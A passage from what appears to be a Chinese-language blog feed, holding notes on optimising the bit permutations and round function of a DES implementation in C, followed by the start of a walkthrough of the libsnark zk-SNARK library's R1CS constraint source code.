class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span> <span class="number">57</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">Y = ((Y &lt;&lt; <span class="number">31</span>) &amp; <span class="number">0xffffffff</span>) | (Y &gt;&gt; <span class="number">1</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"><span class="number">58</span> <span class="number">50</span> <span class="number">42</span> <span class="number">34</span> <span class="number">26</span> <span class="number">18</span> <span class="number">10</span>  <span class="number">2</span> <span class="number">60</span> <span class="number">52</span> <span class="number">44</span> <span class="number">36</span> <span class="number">28</span> <span class="number">20</span> <span class="number">12</span>  <span class="number">4</span> <span class="number">62</span> <span class="number">54</span> <span class="number">46</span> <span class="number">38</span> <span class="number">30</span> <span class="number">22</span> <span class="number">14</span>  <span class="number">6</span> <span class="number">64</span> <span class="number">56</span> <span class="number">48</span> <span class="number">40</span> <span class="number">32</span> <span class="number">24</span> <span class="number">16</span>  <span class="number">8</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">57</span> <span class="number">49</span> <span class="number">41</span> <span class="number">33</span> <span class="number">25</span> <span class="number">17</span>  <span class="number">9</span>  <span class="number">1</span> <span class="number">59</span> <span class="number">51</span> <span class="number">43</span> <span class="number">35</span> <span class="number">27</span> <span class="number">19</span> <span class="number">11</span>  <span class="number">3</span> <span class="number">61</span> <span class="number">53</span> <span class="number">45</span> <span class="number">37</span> <span class="number">29</span> <span class="number">21</span> <span class="number">13</span>  <span class="number">5</span> <span class="number">63</span> <span class="number">55</span> <span class="number">47</span> <span class="number">39</span> <span class="number">31</span> <span class="number">23</span> <span class="number">15</span>  <span class="number">7</span></span><br></pre></td></tr></table></figure></li><li><p>PC-1</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028211906967.png" alt></p><p>注意到PC-1存在如图所示 步长为8 容量为4的连续序列，e.g. Left可将{33, 34, 35, 36}作为基准，打表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_L[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000100</span>, <span class="number">0x00000101</span>,</span><br><span class="line">        <span class="number">0x00010000</span>, <span class="number">0x00010001</span>, <span class="number">0x00010100</span>, <span class="number">0x00010101</span>,</span><br><span class="line">        <span class="number">0x01000000</span>, <span class="number">0x01000001</span>, <span class="number">0x01000100</span>, <span class="number">0x01000101</span>,</span><br><span class="line">        <span class="number">0x01010000</span>, <span class="number">0x01010001</span>, <span class="number">0x01010100</span>, <span class="number">0x01010101</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>输入容量4的连续序列（共$2^4$种状态），将其填入PC-1后{33, 34, 35, 36}所在的位置（其他位置置零），此时输出的uint32_t即为数组上对应位置的值（输出值再整体左移/右移即可实现PC-1）</p><p>Right则是以{39, 38, 37, 4}为基准，不同的是需要逆序输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * based on &#123;39, 38, 37, 4&#125;</span></span><br><span class="line"><span class="comment"> * but input in `reverse` order</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint32_t</span> PC1_R[<span class="number">16</span>] = &#123;</span><br><span class="line">        <span class="number">0x00000000</span>, <span class="number">0x01000000</span>, <span class="number">0x00010000</span>, <span class="number">0x01010000</span>,</span><br><span class="line">        <span class="number">0x00000100</span>, <span class="number">0x01000100</span>, <span class="number">0x00010100</span>, <span class="number">0x01010100</span>,</span><br><span class="line">        <span class="number">0x00000001</span>, <span class="number">0x01000001</span>, <span class="number">0x00010001</span>, <span class="number">0x01010001</span>,</span><br><span class="line">        <span class="number">0x00000101</span>, <span class="number">0x01000101</span>, <span class="number">0x00010101</span>, <span class="number">0x01010101</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但在此之前需要经过下述两次shuffle（同样也是通过PC-1后的状态来<strong>逆推</strong>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span></span><br><span class="line">Y = </span><br><span class="line"><span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = ((Y &gt;&gt; <span class="number">4</span>) ^ X) &amp; <span class="number">0x0f0f0f0f</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= (T &lt;&lt; <span class="number">4</span>)</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">28</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">24</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">32</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br><span class="line">-----------------------------------------</span><br><span class="line">T = (Y ^ X) &amp; <span class="number">0x10101010</span></span><br><span class="line">X ^= T</span><br><span class="line">Y ^= T</span><br><span class="line">-----------------------------------------</span><br><span class="line">X = </span><br><span class="line"> <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">8</span> <span class="number">33</span> <span class="number">34</span> <span class="number">35</span> <span class="number">36</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">16</span> <span class="number">41</span> <span class="number">42</span> <span class="number">43</span> <span class="number">44</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">24</span> <span class="number">49</span> <span class="number">50</span> <span class="number">51</span> <span class="number">52</span> <span class="number">25</span> <span class="number">26</span> <span class="number">27</span> <span class="number">32</span> <span class="number">57</span> <span class="number">58</span> <span class="number">59</span> <span class="number">60</span></span><br><span class="line">Y = </span><br><span class="line"> <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">4</span> <span class="number">37</span> <span class="number">38</span> <span class="number">39</span> <span class="number">40</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">12</span> <span class="number">45</span> <span class="number">46</span> <span class="number">47</span> <span class="number">48</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span> <span class="number">20</span> <span class="number">53</span> <span class="number">54</span> <span class="number">55</span> <span class="number">56</span> <span class="number">29</span> <span class="number">30</span> <span class="number">31</span> <span class="number">28</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>完整的PC-1相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC1(X, Y) &#123;                                                             \</span></span><br><span class="line">    <span class="keyword">uint32_t</span> T;                                                                 \</span><br><span class="line">    T = (((Y) &gt;&gt; <span class="number">4</span>) ^ (X)) &amp; <span class="number">0x0f0f0f0f</span>; (X) ^= T; (Y) ^= (T &lt;&lt; <span class="number">4</span>);             \</span><br><span class="line">    T = ((Y) ^ (X)) &amp; <span class="number">0x10101010</span>; (X) ^= T; (Y) ^= T;                           \</span><br><span class="line">    (X) = (PC1_L[((X) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">4</span>) | (PC1_L[((X) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">5</span>) | (PC1_L[((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">6</span>) | (PC1_L[((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_L[((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">7</span>) | (PC1_L[(X      ) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);      \</span><br><span class="line">    (Y) = (PC1_R[((Y) &gt;&gt; <span class="number">29</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">4</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">25</span>) &amp; <span class="number">0x0f</span>])        \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">3</span>) | (PC1_R[((Y) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">1</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt; <span class="number">13</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">2</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">2</span>)     \</span><br><span class="line">      | (PC1_R[((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x0f</span>] &gt;&gt; <span class="number">1</span>) | (PC1_R[((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x0f</span>] &lt;&lt; <span class="number">3</span>);    \</span><br><span class="line">    (X) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">    (Y) &amp;= <span class="number">0x0fffffff</span>;                                                          \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>PC-2</p><p>PC-2就不存在和PC-1这样显著的特征，因此只能去将<strong>保持原有相对位置</strong>的bit划分至同一批处理，尽可能减少位运算步骤，e.g. 下图所示的原始第8、第12 bit能一起处理<code>(((X) &lt;&lt; 16) &amp; 0x00110000)</code></p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/QQ图片20211028215620.jpg" alt></p><p>完整的PC-2相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC2(X, Y, K) &#123;                                                  \</span></span><br><span class="line">    (K)[<span class="number">0</span>] = (((X) &lt;&lt;  <span class="number">9</span>) &amp; <span class="number">0x00800000</span>) | (((X) &lt;&lt; <span class="number">11</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((X) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0x00110000</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x000a4000</span>) | (((X) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">2</span>) &amp; <span class="number">0x00008008</span>) | (((X) &lt;&lt;  <span class="number">6</span>) &amp; <span class="number">0x00002800</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00000400</span>) | (((X) &gt;&gt;  <span class="number">6</span>) &amp; <span class="number">0x00001004</span>)      \</span><br><span class="line">         | (((X) &gt;&gt;  <span class="number">7</span>) &amp; <span class="number">0x00000220</span>) | (((X) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x00000100</span>)      \</span><br><span class="line">         | (((X) &lt;&lt;  <span class="number">5</span>) &amp; <span class="number">0x00000080</span>) | (((X) &gt;&gt; <span class="number">14</span>) &amp; <span class="number">0x00000042</span>)      \</span><br><span class="line">         | (((X) &gt;&gt; <span class="number">17</span>) &amp; <span class="number">0x00000010</span>) | (((X) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000001</span>);     \</span><br><span class="line">    (K)[<span class="number">1</span>] = (((Y) &lt;&lt;  <span class="number">8</span>) &amp; <span class="number">0x00800100</span>) | (((Y) &lt;&lt; <span class="number">18</span>) &amp; <span class="number">0x00400000</span>)    \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">4</span>) &amp; <span class="number">0x00200000</span>) | (((Y) &lt;&lt;  <span class="number">1</span>) &amp; <span class="number">0x00100000</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt; <span class="number">10</span>) &amp; <span class="number">0x00088000</span>) | (((Y) &lt;&lt; <span class="number">17</span>) &amp; <span class="number">0x00040000</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">9</span>) &amp; <span class="number">0x00020000</span>) | ((Y      ) &amp; <span class="number">0x00010000</span>)        \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">3</span>) &amp; <span class="number">0x00004440</span>) | (((Y) &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x00002010</span>)      \</span><br><span class="line">         | (((Y) &lt;&lt;  <span class="number">4</span>) &amp; <span class="number">0x00001000</span>) | (((Y) &gt;&gt;  <span class="number">1</span>) &amp; <span class="number">0x00000800</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0x00000200</span>) | (((Y) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x00000080</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt;  <span class="number">5</span>) &amp; <span class="number">0x00000020</span>) | (((Y) &gt;&gt;  <span class="number">3</span>) &amp; <span class="number">0x00000008</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x00000004</span>) | (((Y) &gt;&gt; <span class="number">26</span>) &amp; <span class="number">0x00000002</span>)      \</span><br><span class="line">         | (((Y) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0x00000001</span>);                                  \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Expansion Function</p><p><img src= "/img/loading.gif" data-src="/2021/10/28/Engineering-Practice-of-Cryptosystem/image-20211028220127659.png" alt="image-20211028220127659"></p><p>每行均为连续序列，类似PC-2进行位处理（首末行特殊处理）</p><p>轮函数代码实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> f(L, R, K) &#123;                                                                        \</span></span><br><span class="line">    (L) ^= spbox[<span class="number">0</span>][((((R) &gt;&gt; <span class="number">27</span>) &amp; <span class="number">0x1f</span>) | (((R) &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0x20</span>)) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)] \</span><br><span class="line">       | spbox[<span class="number">1</span>][(((R) &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">2</span>][(((R) &gt;&gt; <span class="number">19</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">3</span>][(((R) &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">0</span>]) &amp; <span class="number">0x3f</span>)]                                 \</span><br><span class="line">       | spbox[<span class="number">4</span>][(((R) &gt;&gt; <span class="number">11</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x3f</span>)]                           \</span><br><span class="line">       | spbox[<span class="number">5</span>][(((R) &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3f</span>)]                            \</span><br><span class="line">       | spbox[<span class="number">6</span>][(((R) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x3f</span>) ^ (((K)[<span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)]                             \</span><br><span class="line">       | spbox[<span class="number">7</span>][((((R) &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x3e</span>) | (((R) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x01</span>)) ^ (((K)[<span class="number">1</span>]) &amp; <span class="number">0x3f</span>)];        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>最后的性能测试在25us/KB左右👏算是一个比较显著的提升（</p><p>AES和SM4的相关性能优化trick实际上和前面在DES中<code>gen_spbox()</code>的预处理类似，本质上都是空间换时间（T表），不在此赘述</p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p>简化位运算相关可以移步这本书👇</p><p><a href="https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false" target="_blank" rel="noopener">https://books.google.com.hk/books?id=iBNKMspIlqEC&amp;lpg=SL20-PA11&amp;vq=Transposing+an+8x8-bit+matrix&amp;pg=SL20-PA11&amp;redir_esc=y#v=snippet&amp;q=Transposing%20an%208x8-bit%20matrix&amp;f=false</a></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>libsnark_related</title>
      <link href="/2021/10/17/libsnark-related/"/>
      <url>/2021/10/17/libsnark-related/</url>
      
        <content type="html"><![CDATA[<blockquote><p>近日因为种种原因又拾起了零知识证明方向的相关工作，于是在此简略做一下libsnark相关的记录</p><p><a href="https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d" target="_blank" rel="noopener">https://github.com/scipr-lab/libsnark/tree/2af440246fa2c3d0b1b0a425fb6abd8cc8b9c54d</a></p></blockquote><p>基于zk-SNARKs实现非交互式零知识证明应用的开发顺序可以概括如下：</p><ol><li><p>创建一个r1cs_constraint_system（libsnark设计了gadget的框架帮助构建）；</p></li><li><p>生成proving key和verification key；</p></li><li><p>Alice使用proving key和拥有的可行解构造证明$\pi$；</p></li><li><p>Bob使用verification key验证$\pi$；</p></li></ol><hr><p>下面参考<a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a>中给出的例子，逐步跟进，对gadgetlib1的相关源码进行解析：</p><p>先定位到添加r1cs约束相关的<code>add_r1cs_constraint</code>：</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L51 &amp; protoboard.tcc : L100-110</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_r1cs_constraint</span><span class="params">(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation=<span class="string">""</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> protoboard&lt;FieldT&gt;::add_r1cs_constraint(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;constr, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.constraint_annotations[constraint_system.constraints.size()] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    constraint_system.constraints.emplace_back(constr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>r1cs_constraint_system&lt;FieldT&gt; constraint_system</code></p><p>且<code>constraint_system.constraints</code>的类型为<code>std::vector&lt;r1cs_constraint&lt;FieldT&gt; &gt;</code></p><p>于是我们跟进到<code>r1cs_constraint</code>类：</p><p><strong>libsnark/relations/constraint_satisfaction_problems/r1cs/r1cs.hpp : L41-70</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is a formal expression of the form</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *                &lt; A , X &gt; * &lt; B , X &gt; = &lt; C , X &gt; ,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * where X = (x_0,x_1,...,x_m) is a vector of formal variables and A,B,C each</span></span><br><span class="line"><span class="comment"> * consist of 1+m elements in &lt;FieldT&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A R1CS constraint is used to construct a R1CS constraint system (see below).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">r1cs_constraint</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    linear_combination&lt;FieldT&gt; a, b, c;</span><br><span class="line"></span><br><span class="line">    r1cs_constraint() &#123;&#125;;</span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;a,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;b,</span><br><span class="line">                    <span class="keyword">const</span> linear_combination&lt;FieldT&gt; &amp;c);</span><br><span class="line"></span><br><span class="line">    r1cs_constraint(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;A,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;B,</span><br><span class="line">                    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;linear_combination&lt;FieldT&gt; &gt; &amp;C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;other) <span class="keyword">const</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream&amp; <span class="keyword">operator</span>&lt;&lt; &lt;FieldT&gt;(<span class="built_in">std</span>::ostream &amp;out, <span class="keyword">const</span> r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::istream&amp; <span class="keyword">operator</span>&gt;&gt; &lt;FieldT&gt;(<span class="built_in">std</span>::istream &amp;in, r1cs_constraint&lt;FieldT&gt; &amp;c);</span><br><span 